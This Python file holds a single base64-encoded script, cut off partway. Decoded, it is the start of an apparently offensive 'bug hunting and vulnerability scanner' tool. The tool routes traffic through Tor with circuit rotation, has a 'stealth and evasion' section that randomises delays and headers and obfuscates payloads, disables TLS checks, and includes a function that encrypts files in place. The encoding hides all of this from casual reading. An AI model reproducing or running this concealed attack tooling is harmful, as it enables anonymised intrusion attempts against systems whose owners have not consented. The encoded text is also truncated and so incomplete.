import base64, hashlib, os

code = "aW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgcGFyYW1pa28KaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByZQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlLCBpbml0CmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZSwgcXVvdGVfcGx1cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gamluamEyIGltcG9ydCBUZW1wbGF0ZQppbXBvcnQgdXJsbGliMwppbXBvcnQgcmFuZG9tCmltcG9ydCBiYXNlNjQKZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQKaW1wb3J0IG9zCmltcG9ydCBzb2NrcwppbXBvcnQgc29ja2V0CmZyb20gZnRwbGliIGltcG9ydCBGVFAsIGVycm9yX3Blcm0KaW1wb3J0IHNtdHBsaWIKaW1wb3J0IGRucy5yZXNvbHZlcgppbXBvcnQgeG1sLmV0cmVlLkVsZW1lbnRUcmVlIGFzIEVUCgojIERpc2FibGUgU1NML1RMUyB3YXJuaW5ncwp1cmxsaWIzLmRpc2FibGVfd2FybmluZ3ModXJsbGliMy5leGNlcHRpb25zLkluc2VjdXJlUmVxdWVzdFdhcm5pbmcpCgojIEluaXRpYWxpemUgY29sb3JhbWEKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCiMgQmFubmVyCmRlZiBzaG93X2Jhbm5lcigpOgogICAgcHJpbnQoRm9yZS5CTFVFICsgciIiIgog4paE4paE4paEICAgICAg4paT4paI4paI4paI4paI4paIICAg4paI4paI4paI4paI4paI4paIIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWkyAgIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWkyDilojilojilpMg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWkyDilpLilojilojilojilojiloggICDilojilojiloDilojilojiloggICAgICAg4paE4paI4paI4paI4paIICDilojilojilpEg4paI4paIICDilpLilojilojilojilojiloggICAg4paI4paI4paI4paI4paI4paIIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWkyAg4paI4paI4paI4paI4paI4paIIOKWk+KWiOKWiOKWiOKWiOKWiCAg4paE4paI4paI4paI4paI4paEICAK4paS4paI4paI4paI4paI4paEICAgIOKWk+KWiCAgIOKWgCDilpLilojiloggICAg4paSIOKWkyAg4paI4paI4paSIOKWk+KWkiAgIOKWkyAg4paI4paI4paSIOKWk+KWkuKWk+KWiOKWiOKWkuKWk+KWiOKWiOKWkuKWgOKWiOKWgCDilojilojilpLilpLilojilojilpIgIOKWiOKWiOKWkuKWk+KWiOKWiCDilpIg4paI4paI4paSICAgIOKWiOKWiOKWkiDiloDilojilpLilpPilojilojilpEg4paI4paI4paS4paS4paI4paI4paSICDilojilojilpLilpLilojiloggICAg4paSIOKWkyAg4paI4paI4paSIOKWk+KWkuKWkuKWiOKWiCAgICDilpIg4paT4paIICAg4paAIOKWkuKWiOKWiOKWgCDiloDiloggIArilpLilojiloggIOKWgOKWiOKWhCAg4paS4paI4paI4paIICAg4paRIOKWk+KWiOKWiOKWhCAgIOKWkiDilpPilojilojilpEg4paS4paRICAg4paSIOKWk+KWiOKWiOKWkSDilpLilpHilpLilojilojilpLilpPilojiloggICAg4paT4paI4paI4paR4paS4paI4paI4paRICDilojilojilpLilpPilojilogg4paR4paE4paIIOKWkiAgIOKWkuKWiOKWiOKWkeKWhOKWhOKWhOKWkeKWkuKWiOKWiOKWgOKWgOKWiOKWiOKWkeKWkuKWiOKWiOKWkSAg4paI4paI4paS4paRIOKWk+KWiOKWiOKWhCAgIOKWkiDilpPilojilojilpEg4paS4paR4paRIOKWk+KWiOKWiOKWhCAgIOKWkuKWiOKWiOKWiCAgIOKWkuKWk+KWiCAgICDiloQgCuKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWiCDilpLilpPiloggIOKWhCAgIOKWkiAgIOKWiOKWiOKWkuKWkSDilpPilojilojilpMg4paRICAgIOKWkSDilpPilojilojilpMg4paRIOKWkeKWiOKWiOKWkeKWkuKWiOKWiCAgICDilpLilojilogg4paS4paI4paIICAg4paI4paI4paR4paS4paI4paI4paA4paA4paI4paEICAgICDilpHilpPiloggIOKWiOKWiOKWk+KWkeKWk+KWiCDilpHilojilogg4paS4paI4paIICAg4paI4paI4paRICDilpIgICDilojilojilpLilpEg4paT4paI4paI4paTIOKWkSAgIOKWkiAgIOKWiOKWiOKWkuKWkuKWk+KWiCAg4paEIOKWkuKWk+KWk+KWhCDiloTilojilojilpIKIOKWk+KWiCAgIOKWk+KWiOKWiOKWkuKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkiAg4paS4paI4paI4paSIOKWkSAgICAgIOKWkuKWiOKWiOKWkiDilpEg4paR4paI4paI4paR4paS4paI4paI4paSICAg4paR4paI4paI4paS4paRIOKWiOKWiOKWiOKWiOKWk+KWkuKWkeKWkeKWiOKWiOKWkyDilpLilojilojilpIgICDilpHilpLilpPilojilojilojiloDilpLilpHilpPilojilpLilpHilojilojilpPilpEg4paI4paI4paI4paI4paT4paS4paR4paS4paI4paI4paI4paI4paI4paI4paS4paSICDilpLilojilojilpIg4paRIOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkuKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWkiDilpPilojilojilojiloAg4paRCiDilpLilpIgICDilpPilpLilojilpHilpHilpEg4paS4paRIOKWkeKWkiDilpLilpPilpIg4paSIOKWkSAg4paSIOKWkeKWkSAgICAgICAg4paSIOKWkeKWkSAgIOKWkeKWkyAg4paRIOKWkuKWkSAgIOKWkSAg4paR4paRIOKWkuKWkeKWkuKWkeKWkuKWkSDilpEg4paS4paTIOKWkeKWkuKWk+KWkSAgICDilpHilpIgICDilpIgIOKWkiDilpHilpHilpLilpHilpLilpEg4paS4paR4paS4paR4paS4paRIOKWkiDilpLilpPilpIg4paSIOKWkSAg4paSIOKWkeKWkSAgIOKWkiDilpLilpPilpIg4paSIOKWkeKWkeKWkSDilpLilpEg4paR4paRIOKWkeKWkiDilpIgIOKWkQogIOKWkiAgIOKWkuKWkiDilpEg4paRIOKWkSAg4paR4paRIOKWkeKWkiAg4paRIOKWkSAgICDilpEgICAgICAgICAgIOKWkSAgICAg4paSIOKWkeKWkSAg4paRICAgICAg4paRICDilpEg4paSIOKWkuKWkSAgIOKWkeKWkiDilpEg4paS4paRICAgICDilpEgICDilpEgIOKWkiDilpHilpLilpEg4paRICDilpEg4paSIOKWkuKWkSDilpEg4paR4paSICDilpEg4paRICAgIOKWkSAgICDilpEg4paR4paSICDilpEg4paRIOKWkSDilpEgIOKWkSAg4paRICDilpIgICAKICDilpEgICDilpIgICAgICDilpEgICDilpEgIOKWkSAg4paRICAgIOKWkSAgICAgICAgICAg4paRICAgICAgIOKWkiDilpHilpEgICAgICDilpEgICDilpEg4paRIOKWkSDilpIgICAg4paR4paRICAg4paRICAgIOKWkSDilpEgICDilpEgIOKWkSAg4paR4paRIOKWkeKWkSDilpEg4paRIOKWkiAg4paRICDilpEgIOKWkSAgICDilpEgICAgICDilpEgIOKWkSAg4paRICAgICDilpEgICDilpEgICAgICAgIAogICAgICDilpEgIOKWkSAgIOKWkSAg4paRICAgICAg4paRICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAgICAg4paRICAgICAgIOKWkSDilpEgICAgIOKWkSAgICAgICAgICAgICAg4paRICDilpEgIOKWkSAg4paRICAgIOKWkSDilpEgICAgICAgIOKWkSAgICAgICAgICAgICAgICAg4paRICAgICDilpEgIOKWkeKWkSDilpEgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKWkSAKICAgICIiIikKICAgIHByaW50KEZvcmUuQ1lBTiArIHIiIiIK4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXCuKVkSAgICAgIEJVRyBIVU5USU5HICYgVlVMTkVSQUJJTElUWSBTQ0FOTkVSICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICBFQVNUIFRJTU9SIEdIT1NUIFNFQ1VSSVRZICAgICAgICAgICAg4pWRCuKVkSAgICAgICAgICAgICAgICAgVmVyc2lvbjogMS4zICAgICAgICAgICAgICAgICAgICAg4pWRCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQrilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcK4pWRICBEZXZlbG9wZXI6IFRpbW9yIExlc3RlIFNlY3VyaXR5IFRlYW0gICAgICAgICAgICDilZEK4pWRICBDb250YWN0OiBodHRwczovL3QubWUvZWFzdHRpbW9yZ2hvc3RzZWN1cml0eSAgICDilZEK4pWRICBXQVJOSU5HOiBGb3IgYXV0aG9yaXplZCBwZW5ldHJhdGlvbiB0ZXN0aW5nICAgICDilZEK4pWRICAgICAgICBvbmx5LiBVc2UgYXQgeW91ciBvd24gcmlzayEgICAgICAgICAgICAgICDilZEK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCiAgICAiIiIpCgojIENvbmZpZ3VyYXRpb24KTUFYX1RIUkVBRFMgPSAxMApSRVFVRVNUX1RJTUVPVVQgPSAxMApSQVRFX0xJTUlUID0gNQpUT1JfU09DS1NfUE9SVCA9IDkwNTAKVE9SX0NPTlRST0xfUE9SVCA9IDkwNTEKTE9HX0ZJTEVTID0gWyJzY2FuX2xvZy50eHQiLCAiY3ZlX2xvZy50eHQiLCAicmVwb3J0Lmh0bWwiXQoKIyBFbmNyeXB0aW9uIEtleQpFTkNSWVBUSU9OX0tFWSA9IEZlcm5ldC5nZW5lcmF0ZV9rZXkoKQoKIyAtLS0gVXRpbGl0eSBGdW5jdGlvbnMgLS0tCmRlZiB0eXBld3JpdGVyX2VmZmVjdCh0ZXh0LCBjb2xvcj1Gb3JlLldISVRFLCBkZWxheT0wLjEpOgogICAgZm9yIGNoYXIgaW4gdGV4dDoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGNvbG9yICsgY2hhcikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKGRlbGF5KQogICAgcHJpbnQoKQoKZGVmIGxvYWRpbmdfYW5pbWF0aW9uKG1lc3NhZ2U9IkxvYWRpbmciKToKICAgIGNoYXJzID0gIi/igJNcXHwiCiAgICBmb3IgXyBpbiByYW5nZSgxMCk6CiAgICAgICAgZm9yIGNoYXIgaW4gY2hhcnM6CiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoRm9yZS5ZRUxMT1cgKyBmIlxye21lc3NhZ2V9IHtjaGFyfSIpCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkKICAgIHN5cy5zdGRvdXQud3JpdGUoIlxyIiArICIgIiAqIChsZW4obWVzc2FnZSkgKyAyKSArICJcciIpCgpkZWYgcmVhZF9wYXlsb2Fkc19mcm9tX2ZpbGUoZmlsZV9wYXRoKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAiciIpIGFzIGZpbGU6CiAgICAgICAgICAgIHBheWxvYWRzID0gZmlsZS5yZWFkKCkuc3BsaXRsaW5lcygpCiAgICAgICAgcmV0dXJuIHBheWxvYWRzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkZpbGUge2ZpbGVfcGF0aH0gbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuIFtdCgpkZWYgZW5jcnlwdF9maWxlKGZpbGVfcGF0aCwga2V5KToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicmIiKSBhcyBmaWxlOgogICAgICAgICAgICBkYXRhID0gZmlsZS5yZWFkKCkKICAgICAgICBmZXJuZXQgPSBGZXJuZXQoa2V5KQogICAgICAgIGVuY3J5cHRlZCA9IGZlcm5ldC5lbmNyeXB0KGRhdGEpCiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgIndiIikgYXMgZmlsZToKICAgICAgICAgICAgZmlsZS53cml0ZShlbmNyeXB0ZWQpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkVycm9yIGVuY3J5cHRpbmcgZmlsZToge2V9IikKCmRlZiBzYXZlX3RvX2xvZyhzY2FuX3R5cGUsIHRhcmdldCwgcGF5bG9hZCwgcmVzdWx0LCByZXNwb25zZT1Ob25lKToKICAgIHRpbWVzdGFtcCA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIpCiAgICBsb2dfZW50cnkgPSBmIlt7dGltZXN0YW1wfV0gU2NhbiBUeXBlOiB7c2Nhbl90eXBlfVxuVGFyZ2V0OiB7dGFyZ2V0fVxuUGF5bG9hZDoge3BheWxvYWR9XG5SZXN1bHQ6IHtyZXN1bHR9XG4iCiAgICBpZiByZXNwb25zZToKICAgICAgICBsb2dfZW50cnkgKz0gZiJSZXNwb25zZSBIZWFkZXJzOiB7cmVzcG9uc2UuaGVhZGVyc31cblJlc3BvbnNlIEJvZHk6IHtyZXNwb25zZS50ZXh0Wzo1MDBdfVxuXG4iCiAgICB3aXRoIG9wZW4oInNjYW5fbG9nLnR4dCIsICJhIikgYXMgbG9nX2ZpbGU6CiAgICAgICAgbG9nX2ZpbGUud3JpdGUobG9nX2VudHJ5KQoKZGVmIHNhdmVfY3ZlX2xvZyhzY2FuX3R5cGUsIHRhcmdldCwgcGF5bG9hZCwgZXh0cmFjdGVkX2RhdGEpOgogICAgdGltZXN0YW1wID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVZLSVtLSVkICVIOiVNOiVTIikKICAgIGN2ZV9lbnRyeSA9IGYiW3t0aW1lc3RhbXB9XSBTY2FuIFR5cGU6IHtzY2FuX3R5cGV9XG5UYXJnZXQ6IHt0YXJnZXR9XG5QYXlsb2FkOiB7cGF5bG9hZH1cbkV4dHJhY3RlZCBEYXRhOlxue2V4dHJhY3RlZF9kYXRhfVxuXG4iCiAgICB3aXRoIG9wZW4oImN2ZV9sb2cudHh0IiwgImEiKSBhcyBjdmVfZmlsZToKICAgICAgICBjdmVfZmlsZS53cml0ZShjdmVfZW50cnkpCgpkZWYgZ2VuZXJhdGVfaHRtbF9yZXBvcnQoc2Nhbl90eXBlLCB0YXJnZXQsIHBheWxvYWQsIHJlc3VsdCk6CiAgICB0ZW1wbGF0ZSA9IFRlbXBsYXRlKCIiIgogICAgPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+U2NhbiBSZXBvcnQgLSB7eyBzY2FuX3R5cGUgfX08L3RpdGxlPgogICAgICAgIDxzdHlsZT4KICAgICAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgbWFyZ2luOiA0MHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjZjRmNGY5OyBjb2xvcjogIzMzMzsgfQogICAgICAgICAgICBoMSB7IGNvbG9yOiAjNENBRjUwOyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0KICAgICAgICAgICAgLnJlcG9ydC1jb250YWluZXIgeyBiYWNrZ3JvdW5kOiB3aGl0ZTsgcGFkZGluZzogMjBweDsgYm9yZGVyLXJhZGl1czogOHB4OyBib3gtc2hhZG93OiAwIDAgMTBweCByZ2JhKDAsIDAsIDAsIDAuMSk7IG1heC13aWR0aDogODAwcHg7IG1hcmdpbjogYXV0bzsgfQogICAgICAgICAgICB0YWJsZSB7IHdpZHRoOiAxMDAlOyBib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOyBtYXJnaW4tdG9wOiAyMHB4OyB9CiAgICAgICAgICAgIHRoLCB0ZCB7IHBhZGRpbmc6IDEycHg7IHRleHQtYWxpZ246IGxlZnQ7IGJvcmRlci1ib3R0b206IDFweCBzb2xpZCAjZGRkOyB9CiAgICAgICAgICAgIHRoIHsgYmFja2dyb3VuZC1jb2xvcjogIzRDQUY1MDsgY29sb3I6IHdoaXRlOyB9CiAgICAgICAgICAgIHRyOmhvdmVyIHsgYmFja2dyb3VuZC1jb2xvcjogI2Y1ZjVmNTsgfQogICAgICAgICAgICAudnVsbmVyYWJsZSB7IGNvbG9yOiAjZDMyZjJmOyBmb250LXdlaWdodDogYm9sZDsgfQogICAgICAgICAgICAubm90LXZ1bG5lcmFibGUgeyBjb2xvcjogIzM4OGUzYzsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAgICAgLnRpbWVzdGFtcCB7IGZvbnQtc2l6ZTogMC45ZW07IGNvbG9yOiAjNjY2OyB0ZXh0LWFsaWduOiByaWdodDsgbWFyZ2luLWJvdHRvbTogMjBweDsgfQogICAgICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2IGNsYXNzPSJyZXBvcnQtY29udGFpbmVyIj4KICAgICAgICAgICAgPGgxPlNjYW4gUmVwb3J0IC0ge3sgc2Nhbl90eXBlIH19PC9oMT4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idGltZXN0YW1wIj5SZXBvcnQgZ2VuZXJhdGVkIG9uOiB7eyB0aW1lc3RhbXAgfX08L2Rpdj4KICAgICAgICAgICAgPHRhYmxlPgogICAgICAgICAgICAgICAgPHRyPjx0aD5GaWVsZDwvdGg+PHRoPkRldGFpbHM8L3RoPjwvdHI+CiAgICAgICAgICAgICAgICA8dHI+PHRkPlNjYW4gVHlwZTwvdGQ+PHRkPnt7IHNjYW5fdHlwZSB9fTwvdGQ+PC90cj4KICAgICAgICAgICAgICAgIDx0cj48dGQ+VGFyZ2V0PC90ZD48dGQ+e3sgdGFyZ2V0IH19PC90ZD48L3RyPgogICAgICAgICAgICAgICAgPHRyPjx0ZD5QYXlsb2FkPC90ZD48dGQ+e3sgcGF5bG9hZCB9fTwvdGQ+PC90cj4KICAgICAgICAgICAgICAgIDx0cj48dGQ+UmVzdWx0PC90ZD48dGQgY2xhc3M9InslIGlmICdWdWxuZXJhYmxlJyBpbiByZXN1bHQgJX12dWxuZXJhYmxleyUgZWxzZSAlfW5vdC12dWxuZXJhYmxleyUgZW5kaWYgJX0iPnt7IHJlc3VsdCB9fTwvdGQ+PC90cj4KICAgICAgICAgICAgPC90YWJsZT4KICAgICAgICA8L2Rpdj4KICAgIDwvYm9keT4KICAgIDwvaHRtbD4KICAgICIiIikKICAgIHRpbWVzdGFtcCA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWS0lbS0lZCAlSDolTTolUyIpCiAgICBodG1sX3JlcG9ydCA9IHRlbXBsYXRlLnJlbmRlcigKICAgICAgICBzY2FuX3R5cGU9c2Nhbl90eXBlLAogICAgICAgIHRhcmdldD10YXJnZXQsCiAgICAgICAgcGF5bG9hZD1wYXlsb2FkLAogICAgICAgIHJlc3VsdD1yZXN1bHQsCiAgICAgICAgdGltZXN0YW1wPXRpbWVzdGFtcAogICAgKQogICAgd2l0aCBvcGVuKCJyZXBvcnQuaHRtbCIsICJ3IikgYXMgZmlsZToKICAgICAgICBmaWxlLndyaXRlKGh0bWxfcmVwb3J0KQoKZGVmIHZhbGlkYXRlX3VybCh1cmwpOgogICAgcGFyc2VkID0gdXJscGFyc2UodXJsKQogICAgcmV0dXJuIHBhcnNlZC5zY2hlbWUgaW4gKCJodHRwIiwgImh0dHBzIikgYW5kIHBhcnNlZC5uZXRsb2MKCmRlZiBwcmludF9pbmZvKG1lc3NhZ2UsIGNvbG9yPUZvcmUuQ1lBTik6CiAgICBwcmludChmIlt7Y29sb3J9SU5GT3tTdHlsZS5SRVNFVF9BTEx9XSB7bWVzc2FnZX0iKQoKZGVmIHByaW50X3Jlc3VsdHMocmVzdWx0cyk6CiAgICBmb3IgcGF5bG9hZCwgcmVzdWx0IGluIHJlc3VsdHM6CiAgICAgICAgcHJpbnRfaW5mbyhmIlBheWxvYWQgIDoge3BheWxvYWR9IikKICAgICAgICBwcmludF9pbmZvKGYiU3RhdHVzICAgOiB7cmVzdWx0fSIsIEZvcmUuWUVMTE9XIGlmICJWdWxuZXJhYmxlIiBpbiByZXN1bHQgZWxzZSBGb3JlLlJFRCkKICAgIHByaW50KCItIiAqIDUwKQoKIyAtLS0gVG9yIEZ1bmN0aW9ucyAtLS0KZGVmIHZlcmlmeV90b3JfY29ubmVjdGlvbigpOgogICAgdHJ5OgogICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5zZXNzaW9uKCkKICAgICAgICBzZXNzaW9uLnByb3hpZXMgPSB7CiAgICAgICAgICAgICdodHRwJzogZidzb2NrczVoOi8vMTI3LjAuMC4xOntUT1JfU09DS1NfUE9SVH0nLAogICAgICAgICAgICAnaHR0cHMnOiBmJ3NvY2tzNWg6Ly8xMjcuMC4wLjE6e1RPUl9TT0NLU19QT1JUfScKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSBzZXNzaW9uLmdldCgiaHR0cHM6Ly9jaGVjay50b3Jwcm9qZWN0Lm9yZy8iLCB0aW1lb3V0PTEwKQogICAgICAgIHJldHVybiAiQ29uZ3JhdHVsYXRpb25zLiBUaGlzIGJyb3dzZXIgaXMgY29uZmlndXJlZCB0byB1c2UgVG9yLiIgaW4gcmVzcG9uc2UudGV4dAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiByb3RhdGVfdG9yX2NpcmN1aXQoKToKICAgIHRyeToKICAgICAgICB3aXRoIHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkgYXMgczoKICAgICAgICAgICAgcy5jb25uZWN0KCgnMTI3LjAuMC4xJywgVE9SX0NPTlRST0xfUE9SVCkpCiAgICAgICAgICAgIHMuc2VuZGFsbChiJ0FVVEhFTlRJQ0FURSAiIlxyXG4nKQogICAgICAgICAgICByZXNwb25zZSA9IHMucmVjdigxMDI0KQogICAgICAgICAgICBpZiBiJzI1MCcgbm90IGluIHJlc3BvbnNlOgogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgIHMuc2VuZGFsbChiJ1NJR05BTCBORVdOWU1cclxuJykKICAgICAgICAgICAgcmVzcG9uc2UgPSBzLnJlY3YoMTAyNCkKICAgICAgICAgICAgcmV0dXJuIGInMjUwJyBpbiByZXNwb25zZQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBzZXRfdG9yX3Byb3h5KCk6CiAgICBzb2Nrcy5zZXRfZGVmYXVsdF9wcm94eShzb2Nrcy5TT0NLUzUsICIxMjcuMC4wLjEiLCBUT1JfU09DS1NfUE9SVCkKICAgIHNvY2tldC5zb2NrZXQgPSBzb2Nrcy5zb2Nrc29ja2V0CiAgICBpZiB2ZXJpZnlfdG9yX2Nvbm5lY3Rpb24oKToKICAgICAgICBwcmludChGb3JlLkdSRUVOICsgIltJTkZPXSBUb3IgcHJveHkgaXMgd29ya2luZyBjb3JyZWN0bHkhIikKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxzZToKICAgICAgICBwcmludChGb3JlLlJFRCArICJbRVJST1JdIFRvciBwcm94eSB2ZXJpZmljYXRpb24gZmFpbGVkLiIpCiAgICAgICAgcmV0dXJuIEZhbHNlCgojIC0tLSBTdGVhbHRoICYgRXZhc2lvbiAtLS0KZGVmIHN0ZWFsdGhfZGVsYXkoKToKICAgIHRpbWUuc2xlZXAocmFuZG9tLnVuaWZvcm0oMiwgOCkpCgpkZWYgZ2V0X3JhbmRvbV91c2VyX2FnZW50KCk6CiAgICByZXR1cm4gcmFuZG9tLmNob2ljZShVU0VSX0FHRU5UUykKCmRlZiBvYmZ1c2NhdGVfcGF5bG9hZChwYXlsb2FkKToKICAgIG1ldGhvZCA9IHJhbmRvbS5yYW5kaW50KDEsIDMpCiAgICBpZiBtZXRob2QgPT0gMToKICAgICAgICByZXR1cm4gYmFzZTY0LmI2NGVuY29kZShwYXlsb2FkLmVuY29kZSgpKS5kZWNvZGUoKQogICAgZWxpZiBtZXRob2QgPT0gMjoKICAgICAgICByZXR1cm4gcGF5bG9hZC5lbmNvZGUoKS5oZXgoKQogICAgZWxzZToKICAgICAgICByZXR1cm4gcXVvdGVfcGx1cyhwYXlsb2FkKQoKZGVmIG1ha2Vfc3RlYWx0aHlfcmVxdWVzdCh1cmwsIG1ldGhvZD0iR0VUIiwgcGFyYW1zPU5vbmUsIGRhdGE9Tm9uZSwgaGVhZGVycz1Ob25lKToKICAgIHRyeToKICAgICAgICBzdGVhbHRoX2RlbGF5KCkKICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuc2Vzc2lvbigpCiAgICAgICAgc2Vzc2lvbi5wcm94aWVzID0gewogICAgICAgICAgICAnaHR0cCc6IGYnc29ja3M1aDovLzEyNy4wLjAuMTp7VE9SX1NPQ0tTX1BPUlR9JywKICAgICAgICAgICAgJ2h0dHBzJzogZidzb2NrczVoOi8vMTI3LjAuMC4xOntUT1JfU09DS1NfUE9SVH0nCiAgICAgICAgfQogICAgICAgIGlmIGhlYWRlcnMgaXMgTm9uZToKICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogZ2V0X3JhbmRvbV91c2VyX2FnZW50KCksCiAgICAgICAgICAgICAgICAiQWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsKi8qO3E9MC44IiwKICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjUiLAogICAgICAgICAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlLCBiciIsCiAgICAgICAgICAgICAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICAgICAgICAgICAgICJVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzIjogIjEiLAogICAgICAgICAgICAgICAgIkNhY2hlLUNvbnRyb2wiOiAibWF4LWFnZT0wIgogICAgICAgICAgICB9CiAgICAgICAgZXh0cmFfaGVhZGVycyA9IHsKICAgICAgICAgICAgIkROVCI6IHN0cihyYW5kb20ucmFuZGludCgwLCAxKSksCiAgICAgICAgICAgICJSZWZlcmVyIjogImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwKICAgICAgICAgICAgIlNlYy1GZXRjaC1EZXN0IjogImRvY3VtZW50IiwKICAgICAgICAgICAgIlNlYy1GZXRjaC1Nb2RlIjogIm5hdmlnYXRlIiwKICAgICAgICAgICAgIlNlYy1GZXRjaC1TaXRlIjogIm5vbmUiLAogICAgICAgICAgICAiU2VjLUZldGNoLVVzZXIiOiAiPzEiCiAgICAgICAgfQogICAgICAgIGhlYWRlcnMudXBkYXRlKGV4dHJhX2hlYWRlcnMpCiAgICAgICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgwLjUsIDIuNSkpCiAgICAgICAgaWYgbWV0aG9kLnVwcGVyKCkgPT0gIkdFVCI6CiAgICAgICAgICAgIHJlc3BvbnNlID0gc2Vzc2lvbi5nZXQodXJsLCBwYXJhbXM9cGFyYW1zLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9UkVRVUVTVF9USU1FT1VULCB2ZXJpZnk9RmFsc2UpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmVzcG9uc2UgPSBzZXNzaW9uLnBvc3Q